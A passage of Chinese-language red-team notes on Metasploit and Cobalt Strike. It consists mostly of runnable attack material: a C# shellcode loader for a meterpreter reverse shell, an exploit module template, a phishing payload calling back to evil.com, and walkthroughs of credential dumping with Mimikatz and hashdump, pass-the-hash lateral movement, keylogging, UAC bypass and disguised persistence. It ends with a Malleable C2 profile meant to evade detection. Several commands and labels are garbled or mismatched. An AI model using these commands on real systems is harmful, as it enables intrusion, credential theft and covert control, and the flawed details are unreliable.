        static extern int NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref uint NumberOfBytesToProtect, uint NewAccessProtection, out uint OldAccessProtection);

        static void Main()
        {
            // msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=X LPORT=X -f csharp
            byte[] buf = new byte[510] { 0xfc, 0x48, 0x83... };
            
            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);
            Marshal.Copy(buf, 0, addr, buf.Length);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        }
    }
}
```

### 7.3 自定义模块开发

MSF 模块使用 Ruby 开发，了解基本结构可编写自定义 exploit 或辅助模块。

**目录结构：**
```bash
~/.msf4/modules/
├── exploits/
│   └── custom/
│       └── my_exploit.rb
├── auxiliary/
├── post/
└── payloads/
```

**基础 Exploit 模块模板：**

```ruby
# ~/.msf4/modules/exploits/custom/my_exploit.rb
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'My Custom Exploit',
      'Description'    => 'Exploits a buffer overflow in target service',
      'Author'         => ['Your Name'],
      'License'        => MSF_LICENSE,
      'References'     => [['CVE', '2024-0000']],
      'Platform'       => 'win',
      'Targets'        => [
        ['Windows 10 x64', { 'Ret' => 0x77d4a000, 'Offset' => 260 }]
      ],
      'Payload'        => { 'BadChars' => '\x00\x0a\x0d' },
      'DefaultTarget'  => 0
    ))

    register_options([
      Opt::RPORT(9999),
      OptString.new('USERNAME', [true, 'Username', 'admin']),
    ])
  end

  def check
    connect
    # ... 检查逻辑
    disconnect
    return Exploit::CheckCode::Vulnerable
  end

  def exploit
    connect
    # 构建 buffer
    buffer = rand_text_alpha(target['Offset'])
    buffer << [target['Ret']].pack('V')
    buffer << make_nops(16)
    buffer << payload.encoded

    sock.put(buffer)
    handler
    disconnect
  end
end
```

**基础 Auxiliary 模块模板：**

```ruby
# ~/.msf4/modules/auxiliary/custom/my_scanner.rb
class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Custom Service Scanner',
      'Description' => 'Scans for a custom service',
      'Author'      => ['Your Name'],
      'License'     => MSF_LICENSE
    ))

    register_options([
      Opt::RPORT(1337),
    ])
  end

  def run_host(ip)
    connect
    # 发送探测包
    sock.put("PROBE\r\n")
    response = sock.get_once
    if response && response.include?("SERVICE_ID")
      print_good("#{ip} - Service detected: #{response}")
      report_service(
        host: ip,
        port: rport,
        name: 'custom_service',
        info: response.strip
      )
    end
    disconnect
  end
end
```

### 7.4 MSF 与外部工具联动

#### 与 Nmap 联动

```bash
# 方法1：msfconsole 中直接调用
nmap -sS -sV -O 192.168.1.100/24

# 方法2：导入结果
db_import /path/to/nmap.xml
db_nmap -sV 192.168.1.100

# 自动匹配 exploit
use auxiliary/server/socks_proxy
run -j
```

#### 与 Nessus/OpenVAS 联动

```bash
# 导入漏洞扫描结果
db_import /path/to/nessus.nessus
db_import /path/to/openvas.xml

# 查看漏洞
vulns
hosts -c address,vuln_count

# 对特定漏洞的目标自动利用
use auxiliary/scanner/http/wordpress_login
set RHOSTS 192.168.1.100
run
```

#### 与 Burp Suite 联动

```bash
# 设置代理（通过 Burp 转发 MSF HTTP 流量）
set Proxies http:127.0.0.1:8080
set ReverseAllowProxy true

# 或使用 socks 代理
set Proxies socks4:127.0.0.1:1080
```

---

## 第八章：MSF 实用场景案例

### 案例1：内网横向渗透

```bash
# 1. 外部打点，获取初始会话
use exploit/multi/http/thinkphp_rce
set RHOSTS vpn.company.com
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 192.168.1.100
exploit

# 2. 收集信息
sysinfo
getuid
ipconfig
run post/windows/gather/enum_logged_on_users

# 3. 提权
getsystem
run post/multi/recon/local_exploit_suggester

# 4. 获取凭证
load kiwi
creds_all
hashdump

# 5. 设置跳板（Pivot）扫描内网
run autoroute -s 10.0.0.0/8
run autoroute -p

# 6. 通过跳板扫描内网
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.10.10.0/24
set PORTS 445,3389,22,80,8080
set THREADS 20
run

# 7. 横向移动到内网机器
use exploit/windows/smb/psexec
set RHOSTS 10.10.10.50
set SMBUser Administrator
set SMBPass <hash_from_step4>
set PAYLOAD windows/x64/meterpreter/bind_tcp  # 注意：内网环境用 bind
run
```

### 案例2：Web 应用 Getshell

```bash
# 1. 信息收集
use auxiliary/scanner/http/webdav_scanner
set RHOSTS target.com
run

# 2. SQL 注入探测
use auxiliary/scanner/http/sql_injection
set RHOSTS target.com
set PATH /product.php?id=1
run

# 3. 通过文件上传 getshell
use exploit/multi/http/wp_admin_shell_upload
set RHOSTS target.com
set TARGETURI /wordpress
set USERNAME admin
set PASSWORD admin123
set PAYLOAD php/meterpreter/reverse_tcp
run

# 4. 或通过 SQL 注入 getshell（手工）
# SQLMAP 导出后导入
db_import /tmp/sqlmap_result.xml
```

### 案例3：邮件钓鱼 + 客户端渗透

```bash
# 生成 payload
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=evil.com LPORT=443 -f exe -o invoice.exe

# 设置 HTTPS 监听器
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 443
set HandlerSSLCert /tmp/cert.pem
run -j

# 收到回调后
sysinfo
getuid
# 收集 Outlook/浏览器数据
run post/windows/gather/enum_outlook
run post/windows/gather/enum_chrome
```

---

## 第九章：MSF 排错与调试

### 9.1 常见问题

| 问题 | 可能原因 | 解决方案 |
|------|----------|----------|
| `Exploit failed: Connection refused` | 端口未开放 | 检查目标端口状态 |
| `Exploit failed: The connection was reset` | 连接被重置 | 目标可能有 IPS/防火墙 |
| `Stager failed: Name or service not known` | DNS 解析问题 | 使用 IP 替代域名 |
| `Payload stage failed` | stage 下载失败 | 检查防火墙/网络 |
| `Session opened but no interaction` | 会话断开 | 检查 payload 兼容性 |
| `getsystem failed` | UAC 限制 | 使用 BypassUAC 模块 |
| `Meterpreter session 1 is not valid` | 会话超时 | 重新获取 |
| `Database not connected` | 数据库未启动 | `msfdb start` |

### 9.2 调试技巧

```bash
# 打开详细输出（开发/调试时使用）
set VERBOSE true
set TRACESESSION true

# 设置超时
set WfsDelay 5           # 等待回连的时间（秒）
set ConnectTimeout 10    # 连接超时
set StageRetryCount 3    # stage 重试次数

# 网络问题排查
set ReverseListenerBindAddress 0.0.0.0
set ReverseListenerComm eth0

# 日志记录
set LogLevel 3  # 0-5，5 为最详细
tail -f ~/.msf4/logs/framework.log
```

### 9.3 防火墙环境配置

```bash
# 确保防火墙允许入站
sudo iptables -A INPUT -p tcp --dport 4444 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 443 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT

# 使用端口复用（80/443 通过已开放的端口回连）
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set RPORT 443
```

---

# 第二部分：Cobalt Strike

---

## 第一章：Cobalt Strike 概述

### 1.1 什么是 Cobalt Strike

Cobalt Strike 是一款商业化的**对手模拟（Adversary Simulation）**工具，由 Fortra（原 HelpSystems）开发。它被设计用于红队行动和渗透测试，提供完整的攻击生命周期管理。

**与 MSF 的核心区别：**

| 维度 | MSF | Cobalt Strike |
|------|-----|---------------|
| 定位 | 漏洞利用框架 | 对手模拟/红队平台 |
| 团队协作 | 无内置团队功能 | 团队服务器架构，多人实时协作 |
| 报告生成 | 基础 | 内置团队报告 |
| 社会工程 | 基础 | 强大（钓鱼、Web 克隆） |
| 自定义 | 模块化 Ruby | Aggressor Script (Sleep) |
| C2 通信 | 简单控制 | Malleable C2（高度可定制流量） |
| GUI | 命令行 | 全功能 GUI |
| 价格 | 免费 | 商业授权（~$3,500/年/人） |
| 开源 | ✅ | ❌ |

### 1.2 Cobalt Strike 架构

```
┌─────────────────────────────────────┐
│  Team Server（团队服务器）            │
│  - 管理所有连接                       │
│  - 储存数据                           │
│  - 协调团队                           │
│  - 对外通信                           │
├─────────────────────────────────────┤
│  Client（客户端 - Java GUI）          │
│  - 操作界面                           │
│  - 多人同时连接到 Team Server         │
├─────────────────────────────────────┤
│  Beacon（植入体 - 目标机器）           │
│  - 运行在目标上的 agent               │
│  - 通过 HTTP/DNS/SMB 等通道通信      │
└─────────────────────────────────────┘
```

### 1.3 核心概念速览

| 概念 | 说明 |
|------|------|
| **Team Server** | 服务端，管理所有 beacon 和客户端 |
| **Beacon** | 目标上的植入体，类似 MSF 的 meterpreter |
| **Listener** | 监听器，接收 beacon 回连 |
| **Profile** | Malleable C2 配置文件，定义流量特征 |
| **Aggressor** | 脚本系统，扩展 CS 功能 |
| **Web Drive** | Web 攻击模块（钓鱼、克隆） |
| **Pivot** | 通过已控机器作为跳板 |
| **Artifact** | 生成的 payload 文件（exe/dll/ps1 等） |
| **Sleep** | Aggressor Script 使用的语言 |

---

## 第二章：环境搭建

### 2.1 获取 Cobalt Strike

Cobalt Strike 是商业软件，需要购买授权。下载后会得到 `cobaltstrike.tar.gz`。

> ⚠️ **注意**：本笔记假设你有合法授权。未授权使用 CS 在某些司法管辖区可能违法。

### 2.2 Team Server 部署

**环境要求：**

- **OS**：Linux（推荐 Ubuntu/Debian/CentOS）
- **Java**：OpenJDK 11+（建议 11，CS 4.7+ 支持 11-17）
- **防火墙**：开放必要端口
- **域名**：建议使用未关联的域名或 CDN 前置

```bash
# 解压
tar -xzf cobaltstrike.tar.gz
cd cobaltstrike

# 设置执行权限
chmod +x teamserver
chmod +x start.sh
chmod +x cobaltstrike.jar
chmod +x update

# 启动 Team Server（基础命令）
sudo ./teamserver <server_ip> <password>
# 例如：
sudo ./teamserver 192.168.1.100 SuperSecretPassword123!

# 指定 Malleable Profile 启动
sudo ./teamserver 192.168.1.100 SuperSecretPassword123! /path/to/my.profile

# 指定端口
sudo ./teamserver 192.168.1.100 SuperSecretPassword123! 55553

# 指定 kill date（所有 beacon 在此日期后失效）
sudo ./teamserver 192.168.1.100 SuperSecretPassword123! --killdate 2024-12-31
```

**参数详解：**

| 参数 | 说明 |
|------|------|
| `server_ip` | 团队服务器公网 IP（beacon 回连地址） |
| `password` | 客户端连接密码 |
| `*:port` | 可选，Team Server 端口（默认 55553） |
| `profile` | Malleable C2 配置文件 |
| `--killdate` | 所有 beacon 到期日 |
| `--verbose` | 详细日志 |

**Team Server 安全配置：**

```bash
# 使用 Malleable Profile 混淆指纹
# 修改未授权页面（不要用默认 404）
# 限制客户端 IP（防火墙）

# iptables 限制客户端连接（仅允许公司 IP）
sudo iptables -A INPUT -p tcp --dport 55553 -s your.company.ip/24 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 55553 -j DROP
```

### 2.3 客户端连接

```bash
# Linux/Mac 客户端
java -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar

# Windows 客户端（需要 Java）
java -jar cobaltstrike.jar
```

**连接配置：**

1. 打开客户端 → 输入：
   - **Host**：Team Server 地址（公网 IP 或域名）
   - **Port**：55553（默认）
   - **User**：你的昵称（多个客户端唯一）
   - **Password**：启动时设置的密码

2. 连接后，主界面分为：
   - **顶部菜单**：Cobalt Strike → 所有功能入口
   - **左侧**：会话列表（Beacon 控制台）
   - **中间**：主要操作区域
   - **右侧**：目标列表、凭证、下载文件等标签页

### 2.4 菜单导航

```
Cobalt Strike ✓
├── New Connection         # 新建连接
├── Preferences            # 偏好设置
│   ├── Console            # 控制台颜色/字体
│   ├── Default           # 默认设置
│   └── Proxy             # 代理设置
├── Visualization          # 可视化
│   ├── Auto               # 自动布局
│   ├── Session            # 会话拓扑图
│   └── Pivot              # 跳板关系图
├── VPN Interfaces         # VPN 接口
├── Listening Post         # 监听器
├── Script Manager         # Aggressor 脚本管理
├── Close                  # 关闭
└── Exit                   # 退出

View ✓
├── Applications           # 应用分析
├── Credentials            # 凭证管理
├── Downloads              # 下载的文件
├── Event Log              # 事件日志
├── Keystrokes             # 键盘记录
├── Proxy Pivots           # 代理跳板
├── Screenshots            # 截图
├── Script Console         # 脚本控制台
├── Services               # 服务
├── Sites                  # Web 站点
├── Targets                # 目标
├── Web Log                # Web 日志
└── Web Log                # Web 日志

Attacks ✓
├── Packages               # 生成 payload 包
│   ├── Windows Executable       # Windows EXE
│   ├── Windows Executable (S)   # Windows 可执行文件（stageless）
│   ├── Windows DLL             # Windows DLL
│   ├── Windows DLL (S)         # Windows DLL（stageless）
│   ├── Windows PowerShell      # PowerShell
│   ├── Windows Script          # VBS/SCT
│   ├── Windows Network         # 网络投放
│   └── HTML Application        # HTA
├── Web Drive-by           # Web 驱动下载攻击
│   ├── Manage             # 管理
│   ├── Clone Site         # 克隆网站
│   ├── Host File          # 托管文件
│   ├── Scripted Web Delivery (S)    # 脚本 Web 投递
│   ├── Scripted Web Delivery (S)    # 签名 Applet
│   └── Signed Applet      # 已签名 Applet
├── Generate Phishing      # 生成钓鱼邮件模板
├── Generate Office Macro  # 生成 Office 宏
└── Spoof Email            # 伪造邮件

Reporting ✓
├── Activity Report        # 活动报告
├── Host Report            # 主机报告
├── Indicators of Compromise    # IOC 报告
├── Sessions Report        # 会话报告
├── Social Engineering Report   # 社会工程报告
├── Tactics, Techniques, and Procedures  # TTP 报告
└── Reset Data             # 重置数据
```

---

## 第三章：Listener（监听器）配置

Listener 是 Cobalt Strike 的核心组件，负责接收 beacon 的回连。

### 3.1 Listener 类型

| 类型 | 协议 | 适用场景 |
|------|------|----------|
| **HTTP** | HTTP | 最基本，最常用 |
| **HTTPS** | HTTPS | 加密通信，绕过检测 |
| **DNS** | DNS | 高隐匿，走 DNS 隧道 |
| **SMB** | Named Pipes | 内网横向移动（peer-to-peer） |
| **TCP** | TCP | 内网通信 |
| **External C2** | 自定义 | 通过第三方通道通信 |

### 3.2 HTTP/HTTPS Listener

```bash
# 创建方式：
# Cobalt Strike → Listeners → Add

# HTTP Listener 配置
Name: http-listener
Payload: Beacon HTTP
HTTP Hosts: evil.com, 192.168.1.100    # 多个回连地址
HTTP Host (Stager): evil.com            # stager 回连地址（可选）
Port: 80                                # 监听端口
Profile: default                         # Malleable Profile
Bind to: 0.0.0.0                        # 绑定地址
# HTTP Hosts 可以配置多个，beacon 会逐个尝试
# 建议：使用 CDN 域名或子域名

# HTTPS Listener 配置
Name: https-listener
Payload: Beacon HTTPS
HTTPS Hosts: evil.com, 192.168.1.100
HTTPS Host (Stager): evil.com
Port: 443
Profile: my_ssl_profile                  # SSL 专用 Profile
Certificate:                             # SSL 证书
  # 方式1：使用自己的域名证书
  # 方式2：使用 Let's Encrypt
  # 方式3：生成自签名证书
```

**证书配置：**

```bash
# 使用真实证书（推荐）
# 可以在 Cloudflare / Let's Encrypt 获取
# 在 Listener 设置中导入 .keystore 文件

# 生成 Java KeyStore
keytool -importkeystore -deststorepass password -destkeypass password \
  -destkeystore /tmp/beacon.store -srckeystore /tmp/your-cert.p12 \
  -srcstoretype PKCS12 -srcstorepass password -alias beacon
```

### 3.3 DNS Listener

DNS Listener 提供最高隐匿性，流量淹没在正常 DNS 请求中。

```bash
# 前置条件
# 1. 需要一个域名（如 cdn-service.com）
# 2. 配置 NS 记录指向你的 Team Server
# 3. 配置 A 记录

# DNS 记录配置示例
# cdn-service.com → NS → ns1.cdn-service.com
# ns1.cdn-service.com → A → 1.2.3.4（你的 Team Server IP）

# DNS Listener 配置
Name: dns-listener
Payload: Beacon DNS
DNS Hosts: cdn-service.com              # 你的域名
DNS Host (Stager): cdn-service.com
Port: 53                                # DNS 端口
DNS Resolver:                           # 指定 DNS 服务器解析
  # 留空则使用系统默认 DNS
Profile: dns_profile                    # DNS Profile
```

**DNS 通信模式：**

```
Beacon 行为：
1. 目标解析 xxx.yyy.cdn-service.com
2. Team Server 返回特定编码的 TXT 记录
3. Beacon 解码获取指令/数据

TXT 记录格式：
- 编码在域名中的命令
- TXT 响应中返回数据
- 使用 Base64/Base32 编码
```

### 3.4 SMB Listener（内网横向）

SMB Listener 不直接监听端口，通过命名管道（Named Pipes）通信。

```bash
# 创建 SMB Listener
Name: smb-listener
Payload: Beacon SMB
Pipe Name: mysecret_pipe                 # 命名管道名
# 注意：SMB beacon 必须依赖一个已有的 TCP/HTTP beacon
# 通过已有通道建立 SMB 连接到新目标

# 使用场景：
# 1. 已通过 HTTP beacon 控制 A 机器
# 2. A 机器可访问内网 B 机器
# 3. 在 B 上运行 SMB beacon，通过 A 转发通信
# 4. B 的流量完全通过 A 中转，B 不直接出网
```

### 3.5 TCP Listener

```bash
# TCP Listener（内网使用）
Name: tcp-listener
Payload: Beacon TCP
Port: 5555
# 同样需要已有 beacon 作为父节点
```

### 3.6 External C2

```bash
# External C2 Listener
# 允许通过自定义程序/通道传输 CS 通信
# 适用于：
#  - 通过 SSH 隧道
#  - 通过第三方 C2 框架
#  - 通过 WebSocket
#  - 通过自定义协议
```

### 3.7 多 Listener 策略

```bash
# 实际红队常用策略：
# 1. External：HTTPS Listener（CDN 前置）→ 外网打点
# 2. Internal：DNS Listener → 备用通道
# 3. Pivot：SMB Listener → 横向移动
# 4. 备用：HTTP Listener → 降级备用

# 配置多 Hosts 做 Failover
# HTTP Hosts 中写多个地址
# Beacon 会依次尝试，失败则切换到下一个
```

---

## 第四章：Beacon 详解

Beacon 是运行在目标上的植入体，相当于 MSF 的 Meterpreter。

### 4.1 Beacon 类型

| 类型 | 说明 | 适用场景 |
|------|------|----------|
| **HTTP Beacon** | 通过 HTTP 通信 | 通用，最常用 |
| **HTTPS Beacon** | HTTPS 加密通信 | 有 SSL 检查的环境 |
| **DNS Beacon** | DNS 隧道通信 | 严格出口过滤环境 |
| **SMB Beacon** | 命名管道通信（P2P） | 内网横向，不出网机器 |
| **TCP Beacon** | TCP 套接字通信 | 内网横向 |

### 4.2 Beacon 生成

```bash
# 通过菜单生成：
# Attacks → Packages → Windows Executable
# 或 Atttacks → Web Drive-by → Scripted Web Delivery

# 或通过命令行
# 在 Script Console 中
generate beacon http-listener windows 64 exe
```

**生成选项：**

| 选项 | 说明 |
|------|------|
| **Windows Executable** | EXE 格式，适用性最广 |
| **Windows Executable (S)** | Stageless EXE（单文件无阶段下载） |
| **Windows DLL** | DLL 格式，可用于 DLL 劫持 |
| **Windows DLL (S)** | Stageless DLL |
| **PowerShell** | .ps1 脚本，内存执行 |
| **Script** | .vbs/.sct 脚本 |
| **HTML Application** | .hta 文件 |
| **Java Applet** | Java 小程序 |
| **Office Macro** | Office 宏（VBA） |
| **Python** | Python payload |

**Payload 大小对比：**

```
Staged Beacon:
  - Stager: ~4KB
  - Stage: ~300KB（下载后）

Stageless Beacon:
  - 完整 beacon: ~300KB（直接运行）
  - 无需额外下载
  - 更稳定，但文件更大
```

### 4.3 Beacon 命令体系

#### 系统信息与网络

```beacon
help                        # 查看所有命令
sleep 30                    # 设置回连间隔（秒）
sleep 30 20                 # 设置抖动（jitter）±20 秒

checkin                     # 强制立即回连
!cmd                        # 执行 cmd 命令
shell whoami               # 通过 cmd 执行命令
run ipconfig               # 运行程序并获取输出
execute cmd.exe /c whoami  # 执行但不等待输出
powershell Get-Process    # 使用 PowerShell
powerpick Get-Process     # 无 fork 运行 PowerShell

getuid                     # 当前用户
getsystem                  # 提权到 SYSTEM
getsid                     # 获取 SID
rev2self                   # 恢复令牌

ipconfig / ifconfig        # 网络配置
net view                   # 网络邻居
net view \\target          # 查看目标共享
net computers              # 查看域内主机
net dclist                 # 域控制器列表
net domain                 # 当前域名
net group "Domain Admins"  # 查看域管理员组
net group "Domain Admins" %USERNAME% /add  # 添加域管理员（需权限）
net localgroup Administrators %USERNAME% /add  # 添加本地管理员
net logons                 # 登录历史
net sessions               # 当前会话
net share                  # 共享列表
net time                   # 时间同步
net use \\target\ipc$ password /user:username  # 建立连接
```

#### 文件操作

```beacon
pwd                        # 当前目录
ls                         # 列表
cd C:\Users                # 切换目录
upload /tmp/tools.exe C:\Users\Public\tools.exe  # 上传文件
download C:\secret.txt     # 下载文件
cancel <id>                # 取消下载（查看 download 任务 ID）
rm C:\temp\beacon.exe      # 删除文件
mv C:\old.exe C:\new.exe   # 移动文件
cp C:\a.exe C:\b.exe       # 复制文件
mkdir C:\newdir            # 创建目录
file_browse C:\Users       # 浏览目录（GUI 弹出）
```

#### 进程管理

```beacon
ps                         # 进程列表
ppid <PID>                 # 获取父进程 PID
kill <PID>                 # 结束进程
runas admin C:\Users\foo\payload.exe # 以不同用户运行

# 进程注入
inject <PID> <listener>   # 注入 beacon 到目标进程
# 注入示例：
# inject 1234 https-listener
# 会创建一个新的 beacon 在目标进程中回连到 https-listener

shinject <PID> <x86/x64> <shellcode_file>  # 注入自定义 shellcode
dllinject <PID> <dll_path>                 # 注入 DLL
```

#### 横向移动

```beacon
# Pass-the-Hash（哈希传递）
pth DOMAIN\username <hash>  # 注入哈希到当前会话
# 示例：
peth WORKGROUP\Administrator aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# 远程执行
jump psexec <target> <listener>       # 通过 PsExec 执行
jump winrm <target> <listener>        # 通过 WinRM 执行
jump wmi <target> <listener>          # 通过 WMI 执行
# 注意：在 Jump 前需确保已有目标凭证

# 远程服务管理
remote-exec psexec \\target program.exe
remote-exec winrm \\target cmd.exe /c whoami
remote-exec wmi \\target program.exe
```

### 4.4 凭证收集

```beacon
logonpasswords              # 抓取密码（使用 Mimikatz）
hashdump                    # 抓取 SAM 哈希
dumptokens                  # 转储令牌

# Kerberos Tickets
kerberos_ticket_use <ticket_file>    # 导入 Kerberos 票据
kerberos_ticket_purge                # 清理票据
kerberos_ticket_dump                 # 导出票据

# DPAPI
dpapi <file_path>                    # 解密 DPAPI 加密文件
mimikatz <command>                   # 自定义 Mimikatz 命令

# 常用 Mimikatz 命令
mimikatz sekurlsa::logonPasswords    # 抓取登录密码
mimikatz lsadump::sam                # 抓取 SAM
mimikatz lsadump::cache              # 抓取缓存凭证
mimikatz sekurlsa::wdigest           # 获取 WDigest 凭证
mimikatz sekurlsa::dpapi             # 获取 DPAPI 凭证
mimikatz sekurlsa::ekeys             # 获取 Kerberos 密钥
mimikatz dpapi::masterkey /in:C:\Users\admin\AppData\Roaming\Microsoft\Protect\SID\keyfile
mimikatz dpapi::cred /in:C:\Users\admin\AppData\Local\Microsoft\Credentials\file
```

### 4.5 键盘记录与截屏

```beacon
# 键盘记录
keylogger <PID> <x86/x64>    # 开始记录指定进程的键盘
# 示例：
keylogger 1234 x64
# 查看记录：View → Keystrokes

# 截屏
screenshot <PID> <x86/x64>   # 截取目标屏幕
# 示例：
screenshot 1234 x64
# 查看截屏：View → Screenshots

# 打印屏幕（更稳定）
printscreen                   # 使用 Windows API 截图
```

### 4.6 端口转发与代理

```beacon
# 端口转发（转发目标端口到本团队服务器）
rportfwd <local_port> <target_host> <target_port>
# 示例：转发目标内网 10.10.10.50:3389 到团队服务器 8888 端口
rportfwd 8888 10.10.10.50 3389
# 现在可通过 127.0.0.1:8888 连接 10.10.10.50:3389

# 反向端口转发（本团队服务器监听，转发到目标网段）
rportfwd_local <local_port> <forward_host> <forward_port>

# SOCKS 代理
socks <port>                # 开启 SOCKS 代理
# 示例：
socks 1080
# 现在可配置 proxychains 使用 127.0.0.1:1080

# socks stop               # 停止代理

# 创建跳板（Pivot Listener）
# 在已被控机器上创建新 listener
pivot listener <name> <payload> <port> <bindto>
# 示例：
pivot listener internal-listener beacon_smb 445
```

### 4.7 特权提升

```beacon
# 内置提权
getsystem                    # MSF 风格的 getystem

# UAC Bypass
elevate uac-token-duplication <listener>   # UAC 绕过
elevate uac-wmic <listener>               # WMIC 方式
elevate uac-cmstplua <listener>           # CMSTPLUA 绕过

# 内核提权
elevate ms14-058 <listener>               # TrackPopupMenu 提权
elevate ms15-051 <listener>
elevate ms16-135 <listener>

# 使用已有漏洞利用
# CVE-2021-1732 (Win10 x64)
# CVE-2023-21752 (Win11 x64)
# 需要自行导入对应 Aggressor 脚本

# 查找可用的提权漏洞
# CS 不内置 Local Exploit Suggester
# 可用 BOF（Beacon Object File）实现
```

### 4.8 Beacon 持久化

```beacon
# 持久化到注册表
persistence <listener> <variant>
# 变体：SC_AutoRun / SC_AutoRunHook / SC_Services / SC_Tasks
# 示例：
persistence https-listener SC_AutoRun

# 创建计划任务
schtasks /create /tn "WindowsUpdate" /tr "C:\Users\Public\beacon.exe" \
  /sc onstart /ru SYSTEM

# WMI 事件持久化
# 需要自定义脚本

# DLL 劫持
# 找到常用程序的缺失 DLL，替换为 beacon DLL

# 注意：持久化会增加被发现的风险
#       红队行动中通常不持久化，而是每次从外部重新打入口
```

---

## 第五章：Malleable C2 Profile

Malleable C2 Profile 是 CS 最具特色的功能，允许**完全自定义**网络流量特征，使 beacon 流量看起来像正常应用流量。

### 5.1 为什么需要 Profile

默认 CS 流量特征非常明显：
- 固定的 URI 路径（如 `/jquery-3.3.2.min.js`）
- 固定的 User-Agent
- 固定的 HTTP 头顺序
- 固定的响应体长度

安全产品（EDR/C2 检测规则）可以轻易识别这些特征，Profile 的作用就是**改变这些特征**。

### 5.2 Profile 基本结构

```
http-get {
    # 设置 beacon 从服务器获取任务的 HTTP GET 请求特征
    set uri "/api/v2/analytics";
    set verb "GET";

    client {
        # 客户端请求头
        header "Accept" "application/json, text/plain, */*";
        header "Accept-Language" "en-US,en;q=0.9";
        header "Accept-Encoding" "gzip, deflate";
        header "X-Requested-With" "XMLHttpRequest";
        header "User-Agent" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";

        # 客户端元数据编码与嵌入
        metadata {
            # 将 beacon 元数据编码后放入请求中
            base64url;
            parameter "token";
        }
    }

    server {
        # 服务器响应头
        header "Content-Type" "application/json";
        header "Server" "nginx/1.18.0";
        header "X-Content-Type-Options" "nosniff";
        header "Cache-Control" "no-cache, no-store, must-revalidate";

        # 服务器响应体
        output {
            # 指令数据编码
            base64url;
            netbiosu;
            prepend "{\"data\": \"";
            append "\", \"status\": \"ok\"}";
            print;
        }
    }
}

http-post {
    # 设置 beacon 发送数据的请求特征
    set uri "/api/v2/event";
    set verb "POST";

    client {
        header "Content-Type" "application/json";
        header "Accept" "application/json, text/plain, */*";
        header "Accept-Encoding" "gzip, deflate";
        header "User-Agent" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
        header "Origin" "https://app.example.com";
        header "Referer" "https://app.example.com/";

        # POST 数据体
        id {
            # beacon ID 嵌入
            netbiosu;
            parameter "session";
        }
        output {
            # 输出数据嵌入
            base64url;
            netbiosu;
            prepend "{\"events\": \"";
            append "\", \"timestamp\": " + (now + 172800);
            append "}";
            print;
        }
    }

    server {
        header "Content-Type" "application/json";
        header "Server" "nginx/1.18.0";
        header "Cache-Control" "no-cache, no-store, must-revalidate";

        output {
            # 服务器响应
            prepend "{\"result\": \"ok\"}";
            print;
        }
    }
}

http-stager {
    # Stager 下载 stage 时的请求特征
    set uri_x86 "/api/v1/modules/core.js";
    set uri_x64 "/api/v1/modules/core64.js";

    client {
        header "Accept" "*/*";
        header "Referer" "https://app.example.com/admin/";
        header "Accept-Encoding" "gzip, deflate";
        header "User-Agent" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
    }

    server {
        header "Content-Type" "application/javascript";
        header "Server" "nginx/1.18.0";
        header "Cache-Control" "max-age=3600";

        output {
            # stage 数据伪装为 JS 文件
            prepend "!function(){var _0x4b2e=['";
            append "'];}();";
            print;
        }
    }
}
```

### 5.3 Profile 关键指令

```sleep
# 全局设置
set sample_name "cdn-analytics-v2";     # Profile 名称
set sleeptime "60000";                  # 默认睡眠时间（毫秒）
set jitter "20";                        # 抖动百分比
set maxdns "235";                       # DNS 最大标签长度
set dns_idle "1.2.3.4";                # DNS 空闲时返回的 IP
set dns_sleep "3000";                  # DNS 请求间隔

# HTTP 设置
set useragent "Mozilla/5.0...";        # 默认 User-Agent（建议在块内定义）
set host_stage "false";                # 是否在 HTTP 响应中持有 stage
set pipename "myapp_*";                # SMB 管道名
set pipename_stager "myapp_stager_*";  # SMB stager 管道名
set smb_frame_header "\\x00\\xff\\xff"; # SMB 帧头
set tcp_frame_header "\\x00\\xff\\xff"; # TCP 帧头

# SSL 设置
set https_certificate "/path/to/cert";  # HTTPS 证书
set jarm_hash "29d21c1d71d21c1d...";   # JARM 指纹（高级）
```

### 5.4 数据变换

Profile 提供多种数据变换方式：

| 变换 | 说明 |
|------|------|
| `base64` | Base64 编码 |
| `base64url` | URL 安全 Base64 |
| `netbios` | NetBIOS 编码（大写） |
| `netbiosu` | NetBIOS 编码 |
| `prepend "string"` | 前导字符串 |
| `append "string"` | 追加字符串 |
| `parameter "name"` | 放入 URL 参数 |
| `header "name"` | 放入 HTTP 头 |
| `print` | 输出到 HTTP 体 |
| `uri-append` | 追加到 URI 路径 |
| `mask` | XOR 掩码 |

### 5.5 编写 Profile 的原则

```
1. 选择一个可信目标来模仿
   - CDN（Cloudflare、Akamai）
   - 常见 SaaS（Google Analytics、AWS SDK）
   - 企业常见内网应用（Jira、Confluence、Exchange）

2. 使用真实抓包分析流量特征
   curl -v https://www.google-analytics.com/g/collect?v=2
   # 观察请求头顺序、User-Agent、URI 路径

3. Session 与 Communication 分离
   - 心跳（Heartbeat）用 GET 短请求
   - 数据通信用 POST 长请求
   - 模拟 REST API 风格

4. 设置多个 URI
   - metadata/stage/output 使用不同路径
   - 定期轮换 Profile

5. 验证 Profile
   - 使用 2capcha 或 Wireshark 抓包
   - 检查：是否与模拟目标一致
